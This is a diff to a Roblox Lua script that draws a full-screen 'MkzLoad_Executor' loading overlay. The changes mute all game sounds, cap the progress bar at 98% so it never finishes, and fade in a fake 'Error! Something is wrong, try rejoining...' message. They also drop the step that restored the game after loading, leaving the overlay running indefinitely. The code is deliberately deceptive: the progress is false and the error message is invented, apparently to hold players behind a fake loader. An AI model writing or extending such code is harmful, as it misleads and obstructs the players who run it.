@@ -25,6 +25,15 @@ for _, sound in pairs(game:GetDescendants()) do
 	end
 end
 
+-- impede novos sons de tocar
+game.DescendantAdded:Connect(function(descendant)
+	if descendant:IsA("Sound") then
+		pcall(function()
+			descendant.Volume = 0
+		end)
+	end
+end)
+
 -- === cria a GUI Mkz ===
 local gui = Instance.new("ScreenGui")
 gui.Name = "MkzLoad_Executor"
@@ -123,6 +132,22 @@ phraseLabel.TextStrokeTransparency = 0.8 -- sombra leve
 phraseLabel.TextStrokeColor3 = Color3.fromRGB(0,0,0)
 phraseLabel.ZIndex = 3
 phraseLabel.Parent = bg
+
+-- MENSAGEM DE ERRO (inicialmente invisível)
+local errorLabel = Instance.new("TextLabel")
+errorLabel.Size = UDim2.new(0.8,0,0.08,0)
+errorLabel.Position = UDim2.new(0.5,0,0.58,0)
+errorLabel.AnchorPoint = Vector2.new(0.5,0.5)
+errorLabel.BackgroundTransparency = 1
+errorLabel.Text = "Error! Something is wrong, try rejoining..."
+errorLabel.Font = Enum.Font.GothamBold
+errorLabel.TextScaled = true
+errorLabel.TextColor3 = Color3.fromRGB(255,50,50) -- vermelho
+errorLabel.TextTransparency = 1 -- começa invisível
+errorLabel.TextStrokeTransparency = 1
+errorLabel.TextStrokeColor3 = Color3.fromRGB(0,0,0)
+errorLabel.ZIndex = 3
+errorLabel.Parent = bg
 
 -- barra moldura (cinza) COM SOMBRA
 local barFrame = Instance.new("Frame")
@@ -322,31 +347,49 @@ task.spawn(function()
 	end
 end)
 
--- === ANIMAÇÃO DA BARRA (110 SEGUNDOS FLUIDA) ===
+-- === ANIMAÇÃO DA BARRA (TRAVA EM 98%) ===
 local loadingActive = true
 local startTime = tick()
 local duration = 110
+local errorTriggered = false
+local maxProgress = 0.98 -- LIMITE MÁXIMO
 
 local function updateBar()
 	local elapsed = tick() - startTime
-	local progress = math.clamp(elapsed / duration, 0, 1)
+	local progress = math.clamp(elapsed / duration, 0, maxProgress)
 	
 	fill.Size = UDim2.new(progress, 0, 1, 0)
 	percent.Text = string.format("%d%%", math.floor(progress * 100))
 	
-	return progress < 1
+	-- quando chegar em 98%, mostra o erro
+	if progress >= 0.98 and not errorTriggered then
+		errorTriggered = true
+		phraseActive = false -- para as frases
+		
+		-- fade out nas frases normais
+		task.spawn(function()
+			TweenService:Create(phraseLabel, TweenInfo.new(0.8, Enum.EasingStyle.Quad), {
+				TextTransparency = 1,
+				TextStrokeTransparency = 1
+			}):Play()
+			
+			task.wait(1)
+			
+			-- fade in no erro
+			TweenService:Create(errorLabel, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
+				TextTransparency = 0,
+				TextStrokeTransparency = 0.7
+			}):Play()
+		end)
+	end
+	
+	-- continua rodando para sempre
+	return true
 end
 
 local connection = RunService.Heartbeat:Connect(function()
 	if not loadingActive then return end
-	
-	local stillLoading = updateBar()
-	
-	if not stillLoading then
-		loadingActive = false
-		task.wait(0.5)
-		restoreAll()
-	end
+	updateBar()
 end)
 
 -- === RESTAURAÇÃO ===
@@ -354,6 +397,9 @@ function restoreAll()
 	loadingActive = false
 	phraseActive = false
 	if connection then connection:Disconnect() end
+	
+	-- restaura o volume do jogo
+	SoundService.Volume = originalVolume
 	
 	for _, coreType in ipairs(disabledCore) do
 		pcall(function()
